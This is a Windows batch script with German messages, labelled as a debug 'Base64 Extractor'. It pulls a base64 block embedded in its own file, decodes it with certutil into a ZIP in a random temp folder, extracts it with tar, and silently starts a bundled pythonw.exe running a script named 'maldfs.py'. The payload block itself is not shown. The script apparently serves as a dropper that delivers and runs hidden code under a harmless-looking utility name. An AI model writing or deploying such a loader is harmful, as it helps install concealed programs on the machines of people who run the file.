@echo off
setlocal EnableExtensions DisableDelayedExpansion
title Base64 Extractor - Debug

echo ========================================
echo         Base64 Extractor DEBUG
echo ========================================
echo.

set "TEMP_DIR=%TEMP%\Base64Extract_%RANDOM%_%RANDOM%"
set "B64_FILE=%TEMP_DIR%\input.txt"
set "OUTPUT=%TEMP_DIR%\output.zip"
set "EXTRACT_DIR=%TEMP_DIR%\extracted"

echo [DEBUG] Temp-Ordner: "%TEMP_DIR%"

mkdir "%TEMP_DIR%" 2>nul
if errorlevel 1 (
    echo [FEHLER] Temp-Ordner konnte nicht erstellt werden.
    pause
    exit /b 1
)

mkdir "%EXTRACT_DIR%" 2>nul

echo.
echo [1/5] Suche Base64-Marker...

set "START_LINE="
set "END_LINE="

for /f "tokens=1 delims=:" %%A in ('findstr /n /c ":BASE64_START:" "%~f0"') do set "START_LINE=%%A"
for /f "tokens=1 delims=:" %%A in ('findstr /n /c ":BASE64_END:" "%~f0"') do set "END_LINE=%%A"

echo [DEBUG] START_LINE=%START_LINE%
echo [DEBUG] END_LINE=%END_LINE%

if not defined START_LINE (
    echo [FEHLER] BASE64_START wurde nicht gefunden.
    goto error
)

if not defined END_LINE (
    echo [FEHLER] BASE64_END wurde nicht gefunden.
    goto error
)

set /a START_LINE+=1
set /a END_LINE-=1

if %END_LINE% LSS %START_LINE% (
    echo [FEHLER] Der Base64-Block ist leer.
    goto error
)

echo [DEBUG] Erste Datenzeile: %START_LINE%
echo [DEBUG] Letzte Datenzeile: %END_LINE%

echo.
echo [2/5] Schreibe Base64 in temporaere TXT-Datei...

(for /f "tokens=1,* delims=:" %%A in ('findstr /n "^" "%~f0"') do (
    if %%A geq %START_LINE% if %%A leq %END_LINE% echo(%%B
)) > "%B64_FILE%"

if not exist "%B64_FILE%" (
    echo [FEHLER] Base64-Datei wurde nicht erstellt.
    goto error
)

for %%F in ("%B64_FILE%") do echo [DEBUG] TXT-Dateigroesse: %%~zF Bytes

echo.
echo [3/5] Dekodiere mit certutil...

certutil -f -decode "%B64_FILE%" "%OUTPUT%"
set "RC=%ERRORLEVEL%"
echo [DEBUG] certutil Exitcode: %RC%

if not "%RC%"=="0" (
    echo [FEHLER] Base64-Dekodierung fehlgeschlagen.
    goto error
)

if not exist "%OUTPUT%" (
    echo [FEHLER] ZIP-Datei wurde nicht erstellt.
    goto error
)

for %%F in ("%OUTPUT%") do echo [DEBUG] ZIP-Dateigroesse: %%~zF Bytes

echo.
echo [4/5] Extrahiere mit tar.exe...

where tar.exe
if errorlevel 1 (
    echo [FEHLER] tar.exe wurde nicht gefunden.
    goto error
)

tar.exe -xvf "%OUTPUT%" -C "%EXTRACT_DIR%"
set "RC=%ERRORLEVEL%"
echo [DEBUG] tar Exitcode: %RC%

if not "%RC%"=="0" (
    echo [FEHLER] Extraktion fehlgeschlagen.
    goto error
)

echo.
echo [DEBUG] Inhalt des Extraktionsordners:
dir "%EXTRACT_DIR%" /s

echo.
echo [5/5] Pruefe Startdateien...

if exist "%EXTRACT_DIR%\pythonw.exe" (
    echo [OK] pythonw.exe gefunden.
) else (
    echo [FEHLER] pythonw.exe fehlt.
)

if exist "%EXTRACT_DIR%\maldfs.py" (
    echo [OK] maldfs.py gefunden.
) else (
    echo [FEHLER] maldfs.py fehlt.
)

if exist "%EXTRACT_DIR%\pythonw.exe" if exist "%EXTRACT_DIR%\maldfs.py" (
    echo [DEBUG] Starte Python-Skript...
    start "" "%EXTRACT_DIR%\pythonw.exe" "%EXTRACT_DIR%\maldfs.py"
    echo [DEBUG] Startbefehl wurde abgeschickt.
) else (
    echo [WARNUNG] Start uebersprungen, benoetigte Dateien fehlen.
)

echo.
echo [INFO] Debug-Dateien bleiben erhalten:
echo %TEMP_DIR%
echo.
pause
exit /b 0

:error
echo.
echo [FEHLER] Verarbeitung abgebrochen.
echo [DEBUG] Temp-Dateien bleiben erhalten unter:
echo "%TEMP_DIR%"
echo.
pause
exit /b 1

